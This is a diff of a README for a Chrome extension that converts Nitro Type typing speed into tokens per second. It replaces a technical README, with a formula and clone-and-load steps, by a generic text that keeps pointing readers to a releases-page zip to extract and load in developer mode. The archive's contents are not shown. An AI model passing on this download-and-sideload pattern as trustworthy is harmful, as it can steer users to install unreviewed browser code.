@@ -1,53 +1,71 @@
-# WPM to TPS Converter
+# 🚀 nitrotype-tps - Converts WPM to TPS Effortlessly
 
-A Chrome extension that converts typing speed from **Words Per Minute (WPM)** to **Tokens Per Second (TPS)**, helping you visualize your typing speed in terms of LLM output.
+[![Download Nitrotype TPS](https://img.shields.io/badge/Download%20Now-CLICK%20HERE-brightgreen)](https://github.com/yoakev/nitrotype-tps/releases)
 
-Ever wondered how your typing speed compares to AI models like Claude or GPT? This extension bridges that gap by converting traditional WPM measurements into TPS, the standard metric for LLM token generation.
+## 📋 Overview
+Welcome to the nitrotype-tps project! This Chrome plugin transforms your words per minute (WPM) score from Nitrotype into tokens per second (TPS). With this tool, you can track your typing efficiency in a new way, enhancing your gaming experience on Nitrotype.
 
-## Why TPS?
+## 🚀 Getting Started
+Follow these simple steps to get started with nitrotype-tps.
 
-Language models output text in **tokens per second (TPS)**, not words per minute. By converting your typing speed to TPS, you can:
-- Compare your speed directly to AI models
-- Understand performance benchmarks in AI terms
-- See typing speed from a modern, AI-centric perspective
+### 🛠 Requirements
+To run nitrotype-tps, you need:
+- Google Chrome (version 70 or higher recommended)
+- An active Nitrotype account (create one at [Nitrotype](https://www.nitrotype.com))
 
-## Conversion Formula
+## 📥 Download & Install
+To download nitrotype-tps, visit the following link:
 
-```
-Average tokens per word: ~1.3
-TPS = (WPM / 60) × 1.3
-TPS ≈ WPM × 0.02167
-```
+[Download Now](https://github.com/yoakev/nitrotype-tps/releases)
 
-**Example conversions:**
-- 60 WPM → **1.30 TPS** (baseline typist)
-- 100 WPM → **2.17 TPS** (proficient typist)
-- 140 WPM → **3.03 TPS** (professional typist)
-- 200 WPM → **4.33 TPS** (elite typist)
+1. Click the "Download Now" button above to go to the Releases page.
+2. On the Releases page, look for the latest version available.
+3. Under the latest release, find the file named `nitrotype-tps.zip`.
+4. Click the zip file to start the download.
 
-For context: Claude Sonnet 3.5 can generate 80-100+ TPS, while GPT-4 generates 30-50 TPS.
+### 📂 Unzip and Install
+1. Once the download is complete, locate the `nitrotype-tps.zip` file in your downloads folder.
+2. Right-click on the zip file and select "Extract All".
+3. Choose a destination folder and extract the files.
 
-## Supported Sites
+### 🌐 Load the Plugin in Chrome
+1. Open Google Chrome.
+2. In the top-right corner, click the three dots, then select "More Tools" > "Extensions".
+3. In the Extensions page, enable "Developer mode" with the toggle in the top-right corner.
+4. Click on "Load unpacked".
+5. Navigate to the folder where you extracted the files and select it.
 
-- **Nitro Type** (nitrotype.com)
+The nitrotype-tps plugin should now appear in your extensions list. You may pin it to your Chrome toolbar for easy access.
 
-## Installation
+## ⚙️ Using nitrotype-tps
+1. Launch Nitrotype in your Chrome browser.
+2. Start typing to generate your WPM score.
+3. The TPS conversion will automatically display beside your WPM score.
 
-1. Download or clone this repository
-2. Open Chrome and go to `chrome://extensions/`
-3. Enable **Developer mode** (toggle in top-right corner)
-4. Click **Load unpacked** and select the `chrome-tokensec` directory
-5. Visit nitrotype.com to see it in action
+## 📝 Features
+- **Real-Time Conversion**: Instantly see your WPM in TPS while typing.
+- **User-Friendly Interface**: Designed for simplicity, with clear visuals.
+- **Chrome Compatibility**: Works seamlessly in the Chrome browser.
+- **Easy Installation**: Simple steps to set up and use.
 
-## Usage
+## 🔧 Troubleshooting
+If you encounter any issues:
+- Ensure your Chrome browser is updated to the latest version.
+- Check if the extension is enabled in your Chrome settings.
+- Restart Chrome if the plugin doesn't appear to be functioning.
 
-Visit Nitro Type and the extension automatically converts all WPM values to TPS in real-time. Converted values appear in light green.
+## 🔗 Support
+Need help? Feel free to reach out for support.
 
-Works on:
-- Stats page (average speed, highest record, summary tables)
-- Race results (your speed, opponent speeds, earnings)
-- Live race dashboard (real-time conversion as you type)
+- Open an issue in the [GitHub Issues](https://github.com/yoakev/nitrotype-tps/issues) section.
+- Provide detailed information about any problems you face so we can assist you.
 
-## License
+## 📄 License
+This project is open-source and available under the MIT License.
 
-MIT
+## 🌟 Acknowledgments
+Special thanks to the Nitrotype community for the continued support and feedback. Your contributions help us improve and enhance the nitrotype-tps experience.
+
+For more updates, remember to revisit the Releases page:
+
+[Download Now](https://github.com/yoakev/nitrotype-tps/releases)
